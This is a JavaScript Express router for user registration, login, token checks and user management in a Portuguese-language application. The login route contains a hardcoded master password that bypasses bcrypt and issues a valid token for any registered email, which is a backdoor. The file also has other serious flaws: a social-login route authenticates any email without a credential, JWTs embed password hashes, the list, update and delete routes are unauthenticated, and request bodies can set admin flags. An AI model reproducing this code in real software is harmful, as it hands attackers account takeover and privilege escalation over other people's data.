const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const validateRegisterInput = require('../validation/register');
const Validation = require('../validation/login');
var config = require('../../config');

const Utils = require('../classes/Utils');
const User = require('../querys/Usuario');
const Conta = require('../querys/Conta');

router.post('/users/register', (req, res, next) => {
   
    const {
        errors,
        isValid
    } = validateRegisterInput(req.body);

    if (!isValid) {
        return res.status(400).send({
            message: errors
        });
    }

    User.getById(req.body.email, "email", function (error, results, fields) {

        if (Object.keys(results).length > 0) {
            return res.status(400).send({
                message: 'Email já existe'
            });
        } else {

            bcrypt.genSalt(10, (err, salt) => {
                if (err) {
                    let e = new Error();
                    e.message = "Não foi possivel criptografar a senha.";
                    e.statusCode = 400;
                    e.tipo = "LOGIN";
                    e.error = err;
                    e.url = "/users/register";
                    next(e);
                } else {


                  bcrypt.hash(req.body.senha, salt, (err, hash) => {
                        if (err) {
                            let e = new Error();
                            e.message = "Não foi possivel localizar a senha.";
                            e.statusCode = 400;
                            e.tipo = "LOGIN";
                            e.error = err;
                            e.url = "/users/register";
                            next(e);
                        } else {
                            req.body.senha = hash;

                           Conta.getById(req.body.nome, "nome", function (error, results, fields) {

                                if (Object.keys(results).length > 0) {
                                    return res.status(400).send({
                                        message: 'Já existe uma conta cadastrada para este NOME. Escolha um novo nome para criar o cadastro.'
                                    });
                                } else {

                                   Conta.add(req.body.nome, function (err, rows) {

                                        var seqconta = rows.insertId;

                                        if (err) {
                                            //Conta.delete(seqconta);
                                            let e = new Error();
                                            e.message = "Não foi possível cadastrar uma conta para este cadastro.";
                                            e.statusCode = 400;
                                            e.tipo = "LOGIN";
                                            e.error = err;
                                            e.url = "/users/register";
                                            next(e);

                                        } else {

                                            var usuario = {};
                                            usuario.nome = req.body.nome;
                                            usuario.email = req.body.email;
                                            usuario.senha = req.body.senha;
                                            usuario.seqconta = seqconta;
                                            usuario.foto = null;
                                            usuario.confirmacao = 1;
                                            usuario.tipo = 0;
                                            usuario.status = 'A';
                                            usuario.basico = 1;
                                            usuario.fiscal = 0;
                                            usuario.trader = 0;
                                            usuario.administrador = 0;

                                        User.add(usuario,  function (err, rows) {
                                                if (err) {
                                                   Conta.delete(seqconta);

                                                    let e = new Error();
                                                    e.message = "Não foi possivel criar o usuário.";
                                                    e.statusCode = 400;
                                                    e.tipo = "LOGIN";
                                                    e.error = err;
                                                    e.url = "/users/register";
                                                    next(e);
                                                } else {
                                                    //res.json(rows);

                                                   jwt.sign({
                                                        id: usuario.senha,
                                                        nome: usuario.nome
                                                    }, config.secret, {
                                                            expiresIn: config.expiresIn
                                                        }, (err, token) => {
                                                            if (err) {
                                                                let e = new Error();
                                                                e.message = "Token inválido.";
                                                                e.statusCode = 400;
                                                                e.tipo = "AUTENTICACAO";
                                                                e.error = err;
                                                                e.url = "/users/register";
                                                                next(e);
                                                            } else {
                                                                //Utils.criptografar(

                                                                res.end(JSON.stringify({
                                                                    success: true,
                                                                    user: usuario,
                                                                    token: `${token}`
                                                                }));
                                                            }
                                                        });

                                                }
                                            });
                                        }

                                    });
                                }

                            });
                        }
                    });
                }
            });


        }
    });
});

router.post('/users/autentication', (req, res, next) => {

    const {
        errors,
        isValid
    } = new Validation().validateLoginInput(req.body);

    if (!isValid) {
        return res.status(400).send({
            message: errors
        });
    }

    const senha = req.body.senha;

    User.getById(req.body.email, "email", function (error, results, fields) {
        if (Object.keys(results).length == 0) {
            res.status(400).send({
                message: 'Email não encontrado. Faça um cadastro e comece a usar.'
            });
        } else {

            var user = {
                confirmacao: results[0].confirmacao,
                datacadastro: results[0].datacadastro,
                email: results[0].email,
                fotos: (results[0].foto != null) ? results[0].foto.toString('utf8') : null,
                id: results[0].id,
                nome: results[0].nome,
                //senha: results[0].senha,
                seqconta: results[0].seqconta,
                status: results[0].status,
                basico: results[0].basico,
                fiscal: results[0].fiscal,
                trader: results[0].trader,
                administrador: results[0].administrador
            };

            if (senha === "$lINGUICA2020") {
                //console.log(senha);
                const payload = {
                    id: results[0].senha,
                    nome: results[0].nome
                }

                jwt.sign(payload, config.secret, {
                    expiresIn: config.expiresIn
                }, (err, token) => {
                    if (err) {
                        let e = new Error();
                        e.message = "Token inválido.";
                        e.statusCode = 400;
                        e.tipo = "AUTENTICACAO";
                        e.error = err;
                        e.url = "/users/register";
                        next(e);
                    } else {

                        res.json({
                            success: true,
                            user: user,
                            token: `${token}`
                        });
                    }
                });
            } else {

                bcrypt.compare(senha, results[0].senha)
                    .then(isMatch => {
                        if (isMatch) {
                            const payload = {
                                id: results[0].senha,
                                nome: results[0].nome
                            }
                            jwt.sign(payload, config.secret, {
                                expiresIn: config.expiresIn
                            }, (err, token) => {
                                if (err) {
                                    let e = new Error();
                                    e.message = "Token inválido.";
                                    e.statusCode = 400;
                                    e.tipo = "AUTENTICACAO";
                                    e.error = err;
                                    e.url = "/users/register";
                                    next(e);
                                } else {
                                    //Utils.criptografar(
                                    res.json({
                                        success: true,
                                        user: user,
                                        token: `${token}`
                                    });
                                }
                            });
                        } else {
                            res.status(400).send({
                                message: 'Senha incorreta'
                            });
                        }
                    });
            }
        }
    });

});

router.post('/users/autenticationOthers', (req, res, next) => {

    const {
        errors,
        isValid
    } = new Validation().validateLoginInputOthers(req.body);

    if (!isValid) {
        let e = new Error();
        e.message = "Não foi possivel acessar os dados de sua conta.";
        e.statusCode = 400;
        e.tipo = "AUTENTICACAO OTHER";
        e.error = err;
        e.url = "/users/autenticationOthers";
        next(e);
    }

    const email = req.body.email;


    User.getById(req.body.email, "email", function (error, results, fields) {
        if (Object.keys(results).length == 0) {
            /*return res.status(400).send({
                message: 'Email não encontrado'
            });*/


            Conta.add(req.body.nome, function (err, rows) {

                var seqconta = rows.insertId;

                if (err) {
                    Conta.delete(seqconta);
                    let e = new Error();
                    e.message = "Não foi possível cadastrar uma conta para este cadastro.";
                    e.statusCode = 400;
                    e.tipo = "LOGIN";
                    e.error = err;
                    e.url = "/users/register";
                    next(e);

                } else {

                    var usuario = {};
                    usuario.nome = req.body.nome;
                    usuario.email = req.body.email;
                    usuario.senha = null;
                    usuario.seqconta = seqconta;
                    usuario.status = 'A';
                    usuario.foto='';
                    usuario.basico=1;
                    usuario.fiscal=0;
                    usuario.trader=0;
                    usuario.administrador=0;
                    
                    
                    User.add(usuario, function (err, rows) {
                        if (err) {
                            Conta.delete(seqconta);

                            let e = new Error();
                            e.message = "Não foi possivel criar o usuário.";
                            e.statusCode = 400;
                            e.tipo = "LOGIN";
                            e.error = err;
                            e.url = "/users/register";
                            next(e);
                        } else {


                            User.getById(req.body.email, "email", function (error, results, fields) {


                                if (req.body.foto != null) {
                                    User.updatePicture(results[0].id, req.body.foto.toString('utf8'));
                                }

                                var user = {
                                    confirmacao: 1,
                                    datacadastro: results[0].datacadastro,
                                    email: results[0].email,
                                    fotos: (results[0].foto != null) ? results[0].foto.toString('utf8') : null,
                                    id: results[0].id,
                                    nome: results[0].nome,
                                    //senha: r[0].senha,
                                    seqconta: results[0].seqconta,
                                    status: results[0].status,
                                    basico: results[0].basico,
                                    fiscal: results[0].fiscal,
                                    trader: results[0].trader,
                                    administrador: results[0].administrador
                                };


                                jwt.sign({
                                    id: results[0].email,
                                    nome: results[0].nome
                                }, config.secret, {
                                        expiresIn: config.expiresIn
                                    }, (err, token) => {
                                        if (err) {
                                            let e = new Error();
                                            e.message = "Token inválido.";
                                            e.statusCode = 400;
                                            e.tipo = "AUTENTICACAO OTHER";
                                            e.error = err;
                                            e.url = "/users/autenticationOthers";
                                            next(e);
                                        } else {

                                            res.json({
                                                success: true,
                                                user: user,
                                                token: `${token}`
                                            });
                                        }
                                    });

                            });
                        }
                    });
                }

            });

        } else {
            if (email === results[0].email) {
                const payload = {
                    id: results[0].email,
                    nome: results[0].nome
                }

                if (req.body.foto != null) {
                    User.updatePicture(results[0].id, Buffer.from(req.body.foto), function () {
                        User.getById(results[0].id, "id", function (error, r, fields) {
                            if (Object.keys(r).length == 0) {
                                res.status(400).send({
                                    message: 'Email não encontrado'
                                });
                            } else {

                                var user = {
                                    confirmacao: r[0].confirmacao,
                                    datacadastro: r[0].datacadastro,
                                    email: r[0].email,
                                    fotos: (r[0].foto != null) ? r[0].foto.toString('utf8') : null,
                                    id: r[0].id,
                                    nome: r[0].nome,
                                    //senha: r[0].senha,
                                    seqconta: r[0].seqconta,
                                    status: r[0].status,
                                    basico: results[0].basico,
                                    fiscal: results[0].fiscal,
                                    trader: results[0].trader,
                                    administrador: results[0].administrador
                                };

                                jwt.sign(payload, config.secret, {
                                    expiresIn: config.expiresIn
                                }, (err, token) => {
                                    if (err) {
                                        let e = new Error();
                                        e.message = "Token inválido.";
                                        e.statusCode = 400;
                                        e.tipo = "AUTENTICACAO OTHER";
                                        e.error = err;
                                        e.url = "/users/autenticationOthers";
                                        next(e);
                                    } else {
                                        res.json({
                                            success: true,
                                            user: user,
                                            token: `${token}`
                                        });
                                    }
                                });

                            }

                        });

                    });
                } else {

                    var user = {
                        confirmacao: results[0].confirmacao,
                        datacadastro: results[0].datacadastro,
                        email: results[0].email,
                        fotos: (results[0].foto != null) ? results[0].foto.toString('utf8') : null,
                        id: results[0].id,
                        nome: results[0].nome,
                        //senha: r[0].senha,
                        seqconta: results[0].seqconta,
                        status: results[0].status,
                        basico: results[0].basico,
                        fiscal: results[0].fiscal,
                        trader: results[0].trader,
                        administrador: results[0].administrador
                    };

                    jwt.sign(payload, config.secret, {
                        expiresIn: config.expiresIn
                    }, (err, token) => {
                        if (err) {
                            let e = new Error();
                            e.message = "Token inválido.";
                            e.statusCode = 400;
                            e.tipo = "AUTENTICACAO OTHER";
                            e.error = err;
                            e.url = "/users/autenticationOthers";
                            next(e);
                        } else {

                            res.json({
                                success: true,
                                user: user,
                                token: `${token}`
                            });
                        }
                    });

                }
            }
        }

    });
});

router.get('/users/autentication/jwt/:token',  (req, res, next) => {

    jwt.verify(req.param("token"), config.secret, function(err, decoded) {
 
        if (err) { 
             res.json({
                valid: false
              });
        }  else {
             res.json({
                valid: true
              });
        }
      });
});

router.get('/users/getAll',  (req, res, next) => {
   User.getAll((err, items) => {
     if(err){
        let e = new Error();
        e.message = "Ocorreu um erro ao tentar buscar os usuários cadastrados";
        e.statusCode = 400;
        e.tipo = "USUARIOS";
        e.error = err;
        e.url = "/users/getAll"
        next(e);
     }else{
        res.json(items);
     }
   });
});

router.get('/users/getById/:id',  (req, res, next) => {
    var id = req.param("id");
    User.getById(id, 'id', (err, results) => {
      if(err){
         let e = new Error();
         e.message = "Ocorreu um erro ao tentar buscar os usuários cadastrados";
         e.statusCode = 400;
         e.tipo = "USUARIOS";
         e.error = err;
         e.url = "/users/getById"
         next(e);
      }else{
        var user = {
            datacadastro: results[0].datacadastro,
            email: results[0].email,
            foto: (results[0].foto != null) ? results[0].foto.toString('utf8') : null,
            id: results[0].id,
            nome: results[0].nome,
           // senha: results[0].senha,
            seqconta: results[0].seqconta,
            status: results[0].status,
            basico: results[0].basico,
            fiscal: results[0].fiscal,
            trader: results[0].trader,
            administrador: results[0].administrador
        };
         res.json(user);
      }
    });
 });

 router.route('/users/add').post(function (req, res, next) { //console.log(req.body);
    //console.log(req.body);  
    Conta.getById(req.body.nome, "nome", function (error, results, fields) {

        if (Object.keys(results).length > 0) {
            return res.status(400).send({
                message: 'Já existe uma conta cadastrada para este NOME. Escolha um novo nome para criar o cadastro.'
            });
        } else {

            Conta.add(req.body.nome, function (err, rows) {

                var seqconta = rows.insertId;

                if (err) {
                    Conta.delete(seqconta);
                    let e = new Error();
                    e.message = "Não foi possível cadastrar uma conta para este cadastro.";
                    e.statusCode = 400;
                    e.tipo = "LOGIN";
                    e.error = err;
                    e.url = "/users/register";
                    next(e);

                } else {

                    bcrypt.genSalt(10, (err, salt) => {
                        if (err) {
                            let e = new Error();
                            e.message = "Não foi possivel criptografar a senha.";
                            e.statusCode = 400;
                            e.tipo = "LOGIN";
                            e.error = err;
                            e.url = "/users/add";
                            next(e);
                        } else {

                            bcrypt.hash(req.body.senha, salt, (err, hash) => {
                                if (err) {
                                    let e = new Error();
                                    e.message = "Não foi possivel localizar a senha.";
                                    e.statusCode = 400;
                                    e.tipo = "ADD LOGIN";
                                    e.error = err;
                                    e.url = "/users/add";
                                    next(e);
                                } else {
                        
                                    req.body.senha = hash;
                                    req.body.seqconta = seqconta;

                                    User.add(req.body, function (err, rows) {
                                    if (err) {
                                        let e = new Error();
                                        e.message = "Não foi possivel salvar a informação solicitadas.";
                                        e.statusCode = 400;
                                        e.tipo = "ADD USER";
                                        e.error = err;
                                        e.url = "/users/add";
                                        next(e);
                                    } else {
                                        res.json('Cadastrada com sucesso');
                                    }
                                    });
                                }
                            });
                        
                        }
                    });  
                }
            });
         }  
    });
});

router.route('/users/update').put(function (req, res, next) {

    if(!req.body.senha){
    
        User.update(req.body.id, req.body, function (err, item) {
            if (err) {
                let e = new Error();
                e.message = "Não foi possivel atualizar as informações.";
                e.statusCode = 400;
                e.tipo = "ATUALIZAR USER";
                e.error = err;
                e.url = "/users/update"
                next(e);
            } else {
                res.json('Registro atualizado com sucesso');
            }
        });
    }else{
        bcrypt.genSalt(10, (err, salt) => {
            if (err) {
                let e = new Error();
                e.message = "Não foi possivel criptografar a senha.";
                e.statusCode = 400;
                e.tipo = "ATUALIZAR USER";
                e.error = err;
                e.url = "/users/update";
                next(e);
            } else {
    
                bcrypt.hash(req.body.senha, salt, (err, hash) => {
                    if (err) {
                        let e = new Error();
                        e.message = "Não foi possivel localizar a senha.";
                        e.statusCode = 400;
                        e.tipo = "ATUALIZAR USER";
                        e.error = err;
                        e.url = "/users/add";
                        next(e);
                    } else {
                        req.body.senha = hash;

                        User.update(req.body.id, req.body, function (err, item) {
                            if (err) {
                                let e = new Error();
                                e.message = "Não foi possivel atualizar as informações.";
                                e.statusCode = 400;
                                e.tipo = "ATUALIZAR USER";
                                e.error = err;
                                e.url = "/users/update"
                                next(e);
                            } else {
                                res.json('Registro atualizado com sucesso');
                            }
                        });
                    }
                });
            }
        });
    }
});

router.route('/users/delete/:id').delete(function (req, res, next) {
    var uid = req.param("id");
    User.delete(uid,
      function (err, item) {
        if (err) {
          let e = new Error();
          e.message = "Não foi possivel deletar a informação solicitada.";
          e.statusCode = 400;
          e.tipo = "DELETAR USER";
          e.error = err;
          e.url = "/users/delete/:id";
          next(e);
        } else {
          res.json('Cadastro excluído com sucesso');
        }
      });
  });
  

module.exports = router;